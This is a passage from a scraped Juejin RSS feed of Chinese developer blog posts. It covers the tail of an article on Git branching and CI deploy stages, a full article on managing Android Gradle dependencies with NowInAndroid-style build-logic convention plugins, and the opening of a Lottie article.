    <span class="hljs-bullet">-</span> <span class="hljs-string">develop</span>               <span class="hljs-comment"># 合并到develop时部署到研发环境</span>

<span class="hljs-attr">deploy_to_staging:</span>
  <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>
  <span class="hljs-attr">script:</span> <span class="hljs-string">./deploy.sh</span> <span class="hljs-string">staging</span>
  <span class="hljs-attr">only:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">staging</span>               <span class="hljs-comment"># 合并到staging时部署到测试环境</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">/^release/.*$/</span>        <span class="hljs-comment"># 或发布分支</span>

<span class="hljs-attr">deploy_to_production:</span>
  <span class="hljs-attr">stage:</span> <span class="hljs-string">deploy</span>
  <span class="hljs-attr">script:</span> <span class="hljs-string">./deploy.sh</span> <span class="hljs-string">production</span>
  <span class="hljs-attr">only:</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">main</span>                  <span class="hljs-comment"># 合并到main时部署到生产环境</span>
    <span class="hljs-bullet">-</span> <span class="hljs-string">tags</span>                  <span class="hljs-comment"># 或打标签时部署</span>
</code></pre>
<h3 data-id="heading-16">3. <strong>分支保护规则</strong></h3>
<ul>
<li><strong>main/master</strong>: 强制代码审查、要求CI通过、禁止直接push</li>
<li><strong>staging</strong>: 强制代码审查、要求自动化测试通过</li>
<li><strong>develop</strong>: 要求基本检查通过</li>
</ul>
<hr/>
<h2 data-id="heading-17">六、总结推荐方案</h2>
<p>对于大多数中小型项目，推荐以下简单有效的方案：</p>
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-comment"># 核心分支</span>
main/master     <span class="hljs-comment"># 生产环境（保护分支）</span>
staging         <span class="hljs-comment"># 测试环境（预发布）</span>
develop         <span class="hljs-comment"># 研发环境（可选，如不用则功能分支直接到staging）</span>

<span class="hljs-comment"># 临时分支</span>
feature/*       <span class="hljs-comment"># 功能开发</span>
fix/*           <span class="hljs-comment"># 问题修复</span>
hotfix/*        <span class="hljs-comment"># 生产紧急修复</span>
</code></pre>
<p><strong>使用流程</strong>：</p>
<ol>
<li>从 <code>main</code> 创建 <code>feature/xxx</code> 分支开发</li>
<li>开发完成后，创建 PR 合并到 <code>staging</code>（测试环境）</li>
<li>测试通过后，创建 PR 合并到 <code>main</code>（生产环境）</li>
<li>生产发现问题，从 <code>main</code> 创建 <code>hotfix/xxx</code>，修复后合并回 <code>main</code> 和 <code>staging</code></li>
</ol>
<p>这样的结构清晰、简单，适合 CI/CD 自动化流程。最重要的是<strong>团队统一约定</strong>并严格执行。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android依赖的统一管理]]></title>    <link>https://juejin.cn/post/7589958976226852874</link>    <guid>https://juejin.cn/post/7589958976226852874</guid>    <pubDate>2026-01-02T08:47:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589958976226852874" data-draft-id="7590128405350481920" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android依赖的统一管理"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-01-02T08:47:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Poorguy9527"/> <meta itemprop="url" content="https://juejin.cn/user/1746465251931063"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android依赖的统一管理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1746465251931063/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Poorguy9527
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:47:36.000Z" title="Fri Jan 02 2026 08:47:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读8分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>以NowInAndroid为范本</p>
</blockquote>
<h2 data-id="heading-0">build-logic到底是干什么用的</h2>
<p>NowInAndroid项目中的 <strong><code>build-logic</code> 是一个专门存放“约定插件”的独立模块</strong>，它通过插件化的方式，<strong>集中管理和复用所有模块（如 <code>app</code>、<code>feature</code>、<code>core</code>）的通用Gradle构建配置</strong>。</p>
<p>它的主要目的是将项目中大量重复、分散的Gradle配置代码抽取出来，进行标准化和统一管理。具体来看：</p>
<ol>
<li><strong>消除重复配置</strong>：各个功能模块的 <code>build.gradle.kts</code> 文件因此变得非常简洁，通常只需声明应用哪些约定插件和模块特定的依赖，其他通用配置（如Android插件、Compose、Java版本、测试设置等）都封装在插件中<a href="https://link.juejin.cn?target=https%3A%2F%2Fgitcode.csdn.net%2F663057e9c46af92642795f0e.html" target="_blank" title="https://gitcode.csdn.net/663057e9c46af92642795f0e.html" ref="nofollow noopener noreferrer"/><a href="https://juejin.cn/post/7339024907717804095" target="_blank" title="https://juejin.cn/post/7339024907717804095"/>。</li>
<li><strong>作为“单一可信源”</strong> ：当需要修改通用构建配置（例如，升级Kotlin版本或调整编译选项）时，只需在 <code>build-logic</code> 中修改一次，即可应用到所有相关模块，确保项目配置的一致性并极大降低维护成本</li>
</ol>
<p>那的确很有必要，</p>
<p>看到一堆的业务模块，如果每个模块都要去重复配置和添加依赖，一旦要修改，又要全部修改一遍，实在是浪费时间。</p>
<blockquote>
<p>与app同级的独立文件夹</p>
</blockquote>
<p>并不隶属与app，独立的</p>
<h2 data-id="heading-1">约定优于配置</h2>
<p>在实际的开发中，添加依赖时会想：每增加一个业务模块，就要配置一些相同的依赖，</p>
<p>那么，有没有办法，只需引入一句话就能搞定的呢？</p>
<p>有的，兄弟，包有的。</p>
<p>封装gradle自定义（约定）插件，</p>
<p>每一种插件负责一个特定的配置领域，（Android库，compose，测试等）</p>
<p>职责划分鲜明，组合使用，</p>
<p>避免创建全能的插件，配置组合不够精细，尾大不掉。</p>
<p>当然，</p>
<p>共用的可以约定，</p>
<p>特有的则是按照老办法使用依赖，</p>
<p>这不难理解，</p>
<blockquote>
<p>版本目录/gradle/libs.versions.toml</p>
</blockquote>
<p>通用的，<code>可以不断收集扩张依赖库</code></p>
<p>即使是新项目也是拿来就用，</p>
<p>完全不必要，自己重新记录整理，因为这只是一个依赖目录，</p>
<p>具体的使用，还是要在功能模块的gradle中配置。</p>
<p>随着记录，目录会越来越长。</p>
<p>好在，从名称就能清楚知道，是什么依赖库，</p>
<p>如果不清楚的或者升级时需要同步升级的，那就需要备注好。</p>
<h2 data-id="heading-2">约定插件</h2>
<p>在创建build-logic文件夹的时候，</p>
<p>这是一个不从属于app的独立gradle项目，</p>
<p>而且这实践是Google首次使用，</p>
<p>因此，创建的快捷方式并没有集成到AS中，</p>
<p>所以，文件夹都是手动创建的。（没有忘记怎么用文件夹创建项目）</p>
<ol>
<li>
<p>项目目录创建完成</p>
</li>
<li>
<p>开始创建约定插件</p>
</li>
<li>
<p>/convention/src/mian/kotlin</p>
<p>创建一个名为AndroidApplicationConventionPlugin的kotlin类，</p>
<p>约定Android相关的配置；</p>
</li>
<li>
<p>/convention模块下</p>
<p>创建build.gradle.kts</p>
<p>在文件中，配置编译build-logic需要用到的插件和环境，</p>
<p>然后是register注册约定插件，关联上kotlin类，</p>
</li>
<li>
<p>/build-logic目录下</p>
<p>创建setting.gradle.kts</p>
<p>配置项目的根文件，</p>
<p>将convention关联到build-logic项目下，</p>
<p>现在可以了吗？</p>
<p>还不行，</p>
</li>
<li>
<p>关联build-logic到主项目setting.gradle.kts</p>
<p>在主项目的setting.gradle.kts文件里，</p>
<p>pluginManagment的作用域里，</p>
<p>添加includeBuild("build-logic")，</p>
<p>然后，同步sync。</p>
</li>
<li>
<p>使用约定插件</p>
<p>在业务模块build.gradle.kts文件里，</p>
<p>plugins作用域中，alias关联上约定插件，</p>
<p>试试有没有真的能够正常使用。</p>
<p>以上就是创建约定插件的思路。</p>
<p>还是能够看出来，只需要写一次，就可以到处使用，</p>
<p>真的方便不少。</p>
</li>
</ol>
<h2 data-id="heading-3">为什么apply()的参数不用libs.findLibrary</h2>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">import</span> com.mircles.allfuntionlearning.libs
<span class="hljs-keyword">import</span> org.gradle.api.JavaVersion
<span class="hljs-keyword">import</span> org.gradle.api.Plugin
<span class="hljs-keyword">import</span> org.gradle.api.Project
<span class="hljs-keyword">import</span> org.gradle.kotlin.dsl.configure
<span class="hljs-keyword">import</span> org.gradle.kotlin.dsl.dependencies


<span class="hljs-keyword">class</span> <span class="hljs-title class_">AndroidLibraryConventionPlugin</span> : <span class="hljs-type">Plugin</span>&lt;<span class="hljs-type">Project</span>&gt; {

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">apply</span><span class="hljs-params">(target: <span class="hljs-type">Project</span>)</span></span> {

        with(target) {
            <span class="hljs-comment">// 1. 应用一些必需的基础插件</span>
            pluginManager.apply {
                apply(<span class="hljs-string">"com.android.library"</span>) <span class="hljs-comment">// 应用Android库插件</span>
                apply(<span class="hljs-string">"org.jetbrains.kotlin.android"</span>) <span class="hljs-comment">// 应用Kotlin Android插件</span>
            }

            <span class="hljs-comment">// 2. 配置Android闭包（这是约定的核心）</span>
            extensions.configure&lt;com.android.build.gradle.LibraryExtension&gt; {
                compileSdk = <span class="hljs-number">36</span> <span class="hljs-comment">// 统一编译SDK版本</span>

                defaultConfig {
                    minSdk = <span class="hljs-number">24</span> <span class="hljs-comment">// 统一最小SDK版本</span>
                    <span class="hljs-comment">// 其他通用配置...</span>
                }

                compileOptions {
                    sourceCompatibility = JavaVersion.VERSION_17
                    targetCompatibility = JavaVersion.VERSION_17
                }

                <span class="hljs-comment">// 如果项目使用Compose，可以在这里统一配置</span>
                buildFeatures {
                    compose = <span class="hljs-literal">true</span>
                }
                <span class="hljs-comment">//？？配置的什么</span>
                composeOptions {
                    kotlinCompilerExtensionVersion = <span class="hljs-string">"1.5.4"</span>
                }
            }

            <span class="hljs-comment">// 3. 添加通用依赖</span>
            dependencies {
                <span class="hljs-comment">// 添加对所有Android库模块都通用的依赖</span>

                <span class="hljs-comment">//引用的依赖指向libs.versions.toml文件，这是合理的。alias是？</span>
                <span class="hljs-string">"implementation"</span>(libs.findLibrary(<span class="hljs-string">"androidx-core-ktx"</span>).<span class="hljs-keyword">get</span>())
            }
        }

    }

}
</code></pre>
<p>能做到，但没必要。</p>
<p>这里体现的是Gradle插件依赖管理的“<strong>两级机制</strong>”。</p>
<p><code>apply()</code>应用的参数是主项目的libs.versions的依赖id。</p>
<p>在编译的时候，build-logic会拉取对应的id和版本，编译到约定插件中。</p>
<p>这个问题非常关键，它触及了Gradle约定插件设计的核心模式。这两种不同的写法，恰恰体现了  <strong>“构建配置”与“项目依赖”</strong>  在管理哲学上的根本区别。</p>
<p>简单来说：<strong><code>pluginManager.apply</code> 是在“武装”这个约定插件自身，而 <code>dependencies.add</code> 是在为最终应用该插件的业务模块“预装”通用依赖。</strong></p>
<p>用安装操作系统的比喻来理解：</p>
<ul>
<li><strong>插件</strong> (<code>pluginManager.apply</code>)：就像操作系统安装盘<strong>自带的驱动程序</strong>。没有它们，安装盘本身就无法识别基础硬件（如Android、Kotlin环境）。这些驱动必须在<strong>制作安装盘时就打包进去</strong>。</li>
<li><strong>库依赖</strong> (<code>dependencies.add</code>)：就像操作系统<strong>默认安装的软件包</strong>（如记事本、浏览器）。这些软件包的定义和版本信息保存在一个“软件仓库列表”里，安装系统时再从列表里实时下载安装。</li>
</ul>
<p>下面是这两个层级的详细说明：</p>
<h3 data-id="heading-4"><strong>第一级：构建“安装盘”（编译 <code>build-logic</code> 项目）</strong></h3>
<p>当Gradle编译你的 <code>build-logic</code> 项目，生成约定插件（<code>.class</code>文件）时：</p>
<ol>
<li>
<p><strong><code>pluginManager.apply("com.android.library")</code></strong></p>
<ul>
<li><strong>时机</strong>：在编译<code>build-logic</code><strong>过程中</strong>执行。</li>
<li><strong>作用</strong>：告诉Gradle：“在编译我（这个约定插件）的时候，请把Android库插件和Kotlin插件的能力链接进来。” 只有这样，接下来的 <code>android {}</code> 和 <code>kotlinOptions {}</code> 等扩展才能在代码中被识别和调用。</li>
<li><strong>结果</strong>：这些插件被编译到约定插件的字节码里，成为其<strong>固有的一部分</strong>。</li>
</ul>
</li>
<li>
<p><strong><code>libs.findLibrary("kotlin.stdlib").get()</code></strong></p>
<ul>
<li><strong>时机</strong>：这行代码<strong>本身</strong>在编译<code>build-logic</code>时被编译。但 <code>findLibrary</code> <strong>这个动作</strong>并不会发生，它只是一个“查找指令”被保存下来。</li>
<li><strong>关键</strong>：<code>libs</code> 对象此时只被用作<strong>类型安全的引用</strong>。<code>build-logic</code> 项目需要声明对 <code>version-catalog</code> API 的依赖，才能认识 <code>libs</code> 这个类型，但并不需要（也不会）在此时解析出具体的 <code>kotlin-stdlib:1.9.0</code>。具体的查找动作被<strong>推迟</strong>到第二级。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-5"><strong>第二级：使用“安装盘”（业务模块应用约定插件）</strong></h3>
<p>当你在 <code>:feature:settings</code> 模块中执行 <code>plugins { id("nowinandroid.android.library") }</code> 时：</p>
<ol>
<li>
<p>Gradle会加载并执行已编译好的 <code>AndroidLibraryConventionPlugin</code> 的 <code>apply</code> 方法。</p>
</li>
<li>
<p>当执行到 <code>dependencies.add("implementation", libs.findLibrary("kotlin.stdlib").get())</code> 时：</p>
<ul>
<li><strong>核心</strong>：这里的 <code>libs</code> 对象，<strong>不再是</strong> <code>build-logic</code> 项目里的那个，而是<strong>当前业务模块</strong>（<code>:feature:settings</code>）的 <code>libs</code> 对象！</li>
<li><strong>查找</strong>：它会在当前模块的上下文中，去查找 <code>libs.versions.toml</code> 中定义的 <code>kotlin.stdlib</code>，解析出完整的依赖坐标。</li>
<li><strong>添加</strong>：将这个解析好的依赖，以 <code>implementation</code> 配置添加到当前模块中。</li>
</ul>
</li>
</ol>
<h3 data-id="heading-6"><strong>为什么依赖必须用 <code>findLibrary</code> 这种“推迟”写法？</strong></h3>
<p>这是为了获得<strong>最大的灵活性与可维护性</strong>：</p>
<ol>
<li><strong>单一真实来源</strong>：所有模块的依赖版本始终由根项目的 <code>libs.versions.toml</code> 控制。如果你想升级Kotlin版本，只需在<code>toml</code>文件中改一处，所有应用了约定插件的模块都会自动使用新版本。</li>
<li><strong>避免耦合</strong>：如果像插件一样在 <code>build-logic</code> 中固化依赖版本，那么 <code>build-logic</code> 就需要为每个库声明具体版本，这会使它变得臃肿，且与业务模块的依赖树紧密耦合。</li>
<li><strong>类型安全与IDE支持</strong>：<code>libs.findLibrary</code> 提供了类型安全和IDE自动补全（因为 <code>libs</code> 对象是从Catalog生成的API）。这比写字符串 <code>"org.jetbrains.kotlin:kotlin-stdlib-jdk8:1.9.0"</code> 要安全、方便得多。</li>
</ol>
<h3 data-id="heading-7"><strong>总结与对比</strong></h3>






























<table><thead><tr><th>特性</th><th><code>pluginManager.apply("插件ID")</code></th><th><code>dependencies.add(libs.findLibrary("xxx"))</code></th></tr></thead><tbody><tr><td><strong>作用对象</strong></td><td>装备<strong>约定插件本身</strong>，使其具有特定能力（配置Android、Kotlin）</td><td>为<strong>应用此插件的业务模块</strong>添加通用库依赖</td></tr><tr><td><strong>解析时机</strong></td><td>在<strong>编译 <code>build-logic</code> 项目时</strong>解析并锁定</td><td>在<strong>业务模块应用插件时</strong>，从该模块的Catalog中解析</td></tr><tr><td><strong>版本管理</strong></td><td>版本在 <code>build-logic/build.gradle.kts</code> 的 <code>dependencies</code> 中锁定</td><td>版本延迟到业务模块中，从 <code>libs.versions.toml</code> 解析</td></tr><tr><td><strong>类比</strong></td><td><strong>安装盘自带的驱动</strong>（打包时固化）</td><td><strong>从软件库安装的默认软件</strong>（安装时根据列表下载）</td></tr></tbody></table>
<p>所以，这不是不一致，而是一种精妙的分层设计。它确保了约定插件本身的稳定性和业务模块依赖管理的灵活性。</p>
<p>如果你尝试在 <code>build-logic</code> 的插件代码中硬编码一个库的字符串坐标，你会发现业务模块确实能用到这个依赖，但<strong>版本升级将变得极其困难</strong>，因为你必须重新发布 <code>build-logic</code> 插件。而现在的“推迟查找”模式完美地避免了这个问题。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Android Lottie使用，如何自定义LottieView？]]></title>    <link>https://juejin.cn/post/7589942565011865626</link>    <guid>https://juejin.cn/post/7589942565011865626</guid>    <pubDate>2026-01-02T08:53:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7589942565011865626" data-draft-id="7590503651116253234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Android Lottie使用，如何自定义LottieView？"/> <meta itemprop="keywords" content="前端,Android"/> <meta itemprop="datePublished" content="2026-01-02T08:53:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="国家二级编程爱好者"/> <meta itemprop="url" content="https://juejin.cn/user/317113014162615"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Android Lottie使用，如何自定义LottieView？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/317113014162615/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    国家二级编程爱好者
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-02T08:53:10.000Z" title="Fri Jan 02 2026 08:53:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-02
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">Lottie</h2>
<h3 data-id="heading-1">1.简介</h3>
